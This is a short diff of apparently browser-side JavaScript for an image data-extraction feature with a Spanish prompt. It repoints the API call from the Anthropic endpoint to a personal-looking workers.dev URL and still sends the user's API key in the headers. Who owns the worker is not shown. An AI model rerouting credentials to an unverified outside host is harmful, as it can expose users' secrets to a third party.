@@ -1989,13 +1989,11 @@ Extrae TODOS los datos que puedas ver. Responde SOLO con un JSON válido con est
 }
 Si un campo no está visible, usa "" o 0. No incluyas texto fuera del JSON.`;
 
-  var response = await fetch('https://api.anthropic.com/v1/messages', {
+  var response = await fetch('https://supremekv1.michka1620.workers.dev/vision', {
     method: 'POST',
     headers: {
       'x-api-key': apiKey,
-      'anthropic-version': '2023-06-01',
       'content-type': 'application/json',
-      'anthropic-dangerous-request-proxy-enabled': 'true'
     },
     body: JSON.stringify({
       model: 'claude-opus-4-8',
